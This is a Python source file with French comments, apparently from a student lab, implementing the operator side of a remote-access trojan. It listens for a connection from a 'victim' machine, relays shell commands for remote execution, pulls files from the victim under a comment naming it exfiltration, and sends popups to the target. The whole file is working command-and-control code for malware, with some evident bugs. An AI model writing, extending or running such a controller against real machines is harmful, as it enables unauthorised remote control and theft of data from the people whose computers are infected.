### - IMPORTATIONS

import socket
import os
import subprocess
from time import sleep

import json
from urllib import request


### - VARIABLES


### - FONCTIONS
class Shell:
    def __init__(self, SHELL_PYTHON):
        self.SHELL_BT = SHELL_PYTHON

    def verifications(SHELL_PYTHON):
        verifications = ["shell", "exit", "recv_archive", "help","popup"]
        #Shell : Pour avoir accès à la shell de la victime
        if(SHELL_PYTHON == verifications[0]):
            print("Exécution du shell côté client")
            while True:
                shell = Shell.command()
                if shell == "exit":
                    break  
        #Exit : Pour arrêter le malware coté victime 
        if(SHELL_PYTHON == verifications[1]):
            print("Connexion fermée côté client")
            conn.send("exit".encode())
            conn.close()
            s.close()
            exit()
        #Recv archive : Pour télécharger des fichiers depuis la victime.
        if(verifications[2] in SHELL_PYTHON):
            print("Téléchargement des fichiers depuis la victime...")
            Shell.recv_archive(SHELL_PYTHON)
        if(not SHELL_PYTHON in verifications):
            if(verifications[2] in SHELL_PYTHON):
                return(" ")
        os.system(SHELL_PYTHON)
        print("\n")
        #Help : lister les commandes possibles
        if(SHELL_PYTHON == verifications[3]):
            print("help")
        #Popupclient : Affiche une popup sur l'ordinateur cible
        if(SHELL_PYTHON == verifications[4]):
            conn.send("popup".encode())
            print("Popup envoyée au client")

    def home():
        conn.send("home".encode())
        HOME = conn.recv(1024).decode("latin1")
        return(HOME)

    def command():
        HOME = Shell.home()
        SHELL = str(input("%s>> "%(HOME)))
        if(SHELL == "exit"):
            SHELL = ""
            return("exit")
        conn.send("command".encode())
        sleep(1)
        conn.send(SHELL.encode())
        print(conn.recv(1024).decode("latin1"))

    #Recv Archive Serveur
    def recv_archive(data):
        #Exfiltration du fichier
        f = open (r"C:\Users\ADM_VM01\Desktop\TP2\FichierExfiltré.txt", 'wb')
        conn.send("rcv".encode())
        s.listen(1)
        #Téléchargement de ce dernier
        data = conn.recv(1024)
        f.write(data)
        f.close()
        print("Téléchargement terminé")
        conn.shutdown(2)
        conn.close()

######################--TRAITEMENT--######################

#Gestion des sockets pour la connexion réseau
IP = socket.gethostbyname("localhost")
PORT = 80
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((IP, PORT))
s.listen(10)
conn, cliente = s.accept()
welcome = conn.recv(1024)
print(welcome.decode("latin1"))

while True:
    try:
        shell_btnt = str(input("\033[31m\033[1m[Commande]\033[31m >>\033[1;32m "))
        print("")
        print("Commandes possibles : shell, exit, recv_archive, help, popup")
        print("")
        Shell.verifications(shell_btnt)
    except KeyboardInterrupt:
        conn.close()
        s.close()
        exit()